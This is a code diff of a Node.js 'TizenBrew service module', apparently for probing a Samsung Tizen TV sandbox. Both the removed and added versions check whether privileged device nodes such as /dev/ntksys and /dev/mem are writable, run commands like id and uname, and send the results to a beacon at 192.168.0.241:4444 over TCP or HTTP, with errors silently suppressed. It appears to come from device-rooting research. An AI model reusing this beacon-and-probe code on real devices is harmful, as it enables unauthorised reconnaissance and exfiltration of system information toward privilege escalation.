@@ -1,49 +1,57 @@
-// TizenBrew service module - ntksys probe
-const net = require('net');
-const fs = require('fs');
-const { execSync } = require('child_process');
+// TizenBrew service module v2 - diagnostic
+// Try each module individually to find what's available in the sandbox
 
-const BEACON_IP = '192.168.0.241';
-const BEACON_PORT = 4444;
+try {
+  const http = require('http');
+  const BEACON = 'http://192.168.0.241:4444/';
 
-const sock = new net.Socket();
-sock.connect(BEACON_PORT, BEACON_IP, () => {
   const lines = [];
-  lines.push('=== TizenBrew ntksys probe ===');
+  lines.push('=== TizenBrew sandbox probe ===');
 
-  // 1. What uid are we?
-  try { lines.push(fs.readFileSync('/proc/self/status', 'utf8').split('\n').slice(0,10).join('\n')); }
-  catch(e) { lines.push('status: ' + e.message); }
-
-  // 2. Check ntksys devices
-  for (const dev of ['/dev/ntksys', '/dev/ntkhdma', '/dev/sdp_mem', '/dev/mem']) {
-    try {
-      const fd = fs.openSync(dev, 'r+');
-      lines.push(dev + ': EXISTS (opened O_RDWR)');
-      fs.closeSync(fd);
-    } catch(e) {
-      lines.push(dev + ': ' + e.message);
-    }
+  // What require gives us
+  const mods = ['fs','net','http','child_process','os','path','crypto','util'];
+  for (const m of mods) {
+    try { require(m); lines.push('require(' + m + '): OK'); }
+    catch(e) { lines.push('require(' + m + '): FAIL - ' + e.message); }
   }
 
-  // 3. Can we exec /bin/sh (signed binary)?
+  // Check /dev/ntksys via fs
   try {
-    const r = execSync('id; uname -a; cat /proc/cmdline', { timeout: 5000 });
-    lines.push('exec works:\n' + r.toString());
+    const fs = require('fs');
+    const fd = fs.openSync('/dev/ntksys', 'r+');
+    lines.push('/dev/ntksys: EXISTS (fd=' + fd + ')');
+    fs.closeSync(fd);
   } catch(e) {
-    lines.push('exec failed: ' + e.message);
+    lines.push('/dev/ntksys: ' + e.message);
   }
 
-  // 4. Try running our probe binary if present
+  // exec id
   try {
-    const r = execSync('/home/owner/share/tmp/sdk_tools/probe', { timeout: 3000 });
-    lines.push('probe exec: ' + r.toString());
+    const { execSync } = require('child_process');
+    lines.push('id: ' + execSync('id', { timeout: 3000 }).toString().trim());
   } catch(e) {
-    lines.push('probe exec failed: ' + e.message);
+    lines.push('id exec: ' + e.message);
   }
 
-  sock.write(lines.join('\n') + '\n=== DONE ===\n');
-  sock.end();
-});
+  // Send back via HTTP GET to beacon
+  const body = lines.join('\n');
+  const opts = {
+    method: 'POST',
+    hostname: '192.168.0.241',
+    port: 4444,
+    path: '/',
+    headers: { 'Content-Length': Buffer.byteLength(body) }
+  };
+  const req = http.request(opts, () => {});
+  req.on('error', () => {});
+  req.write(body);
+  req.end();
 
-sock.on('error', (e) => { /* silent */ });
+} catch(e) {
+  // Last resort: try net directly
+  try {
+    const net = require('net');
+    const s = new net.Socket();
+    s.connect(4444, '192.168.0.241', () => { s.write('CRASH: ' + e.message + '\n' + (e.stack||'')); s.end(); });
+  } catch(e2) {}
+}
